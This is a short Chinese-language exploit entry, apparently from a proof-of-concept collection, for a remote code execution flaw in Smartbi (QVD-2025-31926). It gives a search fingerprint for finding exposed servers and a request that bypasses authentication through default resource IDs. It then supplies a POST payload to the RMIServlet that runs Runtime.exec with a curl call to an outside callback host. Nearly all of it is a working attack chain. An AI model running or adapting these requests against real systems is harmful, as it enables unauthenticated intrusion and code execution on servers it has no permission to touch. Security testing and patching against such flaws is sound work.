# Smartbi远程代码执行漏洞(QVD-2025-31926)

- **系统**：Smartbi　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="SMARTBI"`
- **请求**：`GET /smartbi/vision/share.jsp?resid=b904ab9f5a84712a672523a7b4881ee4 HTTP/1.1`

**请求体 / payload**
```
通过默认资源ID绕过身份验证获取合法session
Host:
数据库存在两个满足条件的relateid 值：
96a0a9d0b86f90d5416d013f4cfe2f23 和b904ab9f5a84712a672523a7b4881ee4
携带合法cookie后台代码执行
POST /smartbi/vision/RMIServlet HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Cookie: JSESSIONID=810863C9F06505AEF3867581A47AA35C
className=MetricsModelForVModule&methodName=checkExpression&params=["java.lang.Runtime.getRuntime().exec('curl fimmnxmlze.iyhc.eu.org')"]
```
- **预期**：200　|　—